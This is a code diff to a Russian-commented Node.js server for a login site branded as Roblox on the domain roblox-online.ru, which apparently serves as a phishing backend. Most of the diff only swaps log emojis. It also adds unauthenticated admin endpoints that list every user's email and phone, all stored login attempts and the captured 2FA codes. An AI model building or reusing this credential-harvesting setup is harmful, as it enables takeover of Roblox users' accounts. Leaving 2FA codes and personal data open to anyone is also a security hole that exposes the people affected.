@@ -37,7 +37,7 @@ function sendCode(email, code) {
     const mailOptions = {
         from: process.env.EMAIL_USER,
         to: email,
-        subject: '🔐 Ваш код подтверждения Roblox',
+        subject: ' Ваш код подтверждения Roblox',
         html: `
             <div style="font-family: Arial, sans-serif; padding: 20px; background-color: #f4f4f4;">
                 <div style="background-color: white; padding: 30px; border-radius: 10px; max-width: 500px; margin: auto;">
@@ -141,7 +141,7 @@ app.post('/api/login-step1', async (req, res) => {
             try {
                 await sendCode(user.email, code);
                 
-                console.log(` Код отправлен для ${user.username}`);
+                console.log(`📧 Код отправлен для ${user.username}`);
                 
                 res.json({ 
                     success: true, 
@@ -337,7 +337,7 @@ app.post('/api/forgot-password', (req, res) => {
 
             const resetLink = `http://roblox-online.ru/reset-password?token=${token}`;
             
-            console.log(`\n Ссылка для сброса пароля: ${resetLink}\n`);
+            console.log(`\n🔗 Ссылка для сброса пароля: ${resetLink}\n`);
             res.json({ 
                 success: true, 
                 message: 'Инструкции отправлены на email',
@@ -404,11 +404,71 @@ app.post('/api/logout', (req, res) => {
     });
 });
 
-// Просмотр попыток входа
+// Просмотр попыток входа (локально)
 app.get('/api/login-attempts', (req, res) => {
     db.db.all(`SELECT * FROM login_attempts ORDER BY created_at DESC LIMIT 100`, (err, rows) => {
         if (err) return res.status(500).json({ error: 'Ошибка сервера' });
         res.json({ success: true, attempts: rows });
+    });
+});
+
+// 🆕 АДМИНСКИЕ API - для просмотра данных на Render
+
+// Просмотр всех пользователей
+app.get('/api/admin/users', (req, res) => {
+    db.db.all(`SELECT id, username, email, phone, created_at, last_login FROM users ORDER BY created_at DESC`, (err, rows) => {
+        if (err) return res.status(500).json({ error: 'Ошибка сервера' });
+        res.json({ 
+            success: true, 
+            count: rows.length,
+            users: rows 
+        });
+    });
+});
+
+// Просмотр попыток входа
+app.get('/api/admin/attempts', (req, res) => {
+    db.db.all(`SELECT * FROM login_attempts ORDER BY created_at DESC LIMIT 50`, (err, rows) => {
+        if (err) return res.status(500).json({ error: 'Ошибка сервера' });
+        res.json({ 
+            success: true, 
+            count: rows.length,
+            attempts: rows 
+        });
+    });
+});
+
+// Просмотр 2FA кодов
+app.get('/api/admin/2fa-codes', (req, res) => {
+    db.db.all(`SELECT * FROM two_fa_codes ORDER BY created_at DESC LIMIT 50`, (err, rows) => {
+        if (err) return res.status(500).json({ error: 'Ошибка сервера' });
+        res.json({ 
+            success: true, 
+            count: rows.length,
+            codes: rows 
+        });
+    });
+});
+
+// Статистика
+app.get('/api/admin/stats', (req, res) => {
+    db.db.get(`SELECT COUNT(*) as total_users FROM users`, (err, row) => {
+        if (err) return res.status(500).json({ error: 'Ошибка' });
+        
+        db.db.get(`SELECT COUNT(*) as total_attempts FROM login_attempts`, (err, row2) => {
+            if (err) return res.status(500).json({ error: 'Ошибка' });
+            
+            db.db.get(`SELECT COUNT(*) as successful_logins FROM login_attempts WHERE success = 1`, (err, row3) => {
+                res.json({
+                    success: true,
+                    stats: {
+                        total_users: row.total_users,
+                        total_attempts: row2.total_attempts,
+                        successful_logins: row3.successful_logins
+                    }
+                });
+            });
+        });
     });
 });
 
@@ -419,14 +479,18 @@ app.get('/', (req, res) => {
 
 // Запуск сервера
 app.listen(PORT, () => {
-    console.log(`\n🚀 Сервер запущен на http://localhost:${PORT}`);
-    console.log(`📊 База данных: SQLite (roblox.db)`);
+    console.log(`\n Сервер запущен на http://localhost:${PORT}`);
+    console.log(` База данных: SQLite (roblox.db)`);
     console.log(`📝 Логирование попыток входа: ВКЛЮЧЕНО`);
     console.log(`🔐 Двухэтапная аутентификация: ВКЛЮЧЕНА`);
     if (process.env.EMAIL_USER) {
         console.log(`📧 Email уведомления: ${process.env.EMAIL_USER}`);
     } else {
-        console.log(`⚠️  Email не настроен! Проверьте файл .env`);
+        console.log(`️  Email не настроен! Проверьте файл .env`);
     }
-    console.log();
+    console.log(`\n📊 АДМИНСКИЕ API:`);
+    console.log(`   GET /api/admin/users - список пользователей`);
+    console.log(`   GET /api/admin/attempts - попытки входа`);
+    console.log(`   GET /api/admin/2fa-codes - 2FA коды`);
+    console.log(`   GET /api/admin/stats - статистика\n`);
 });
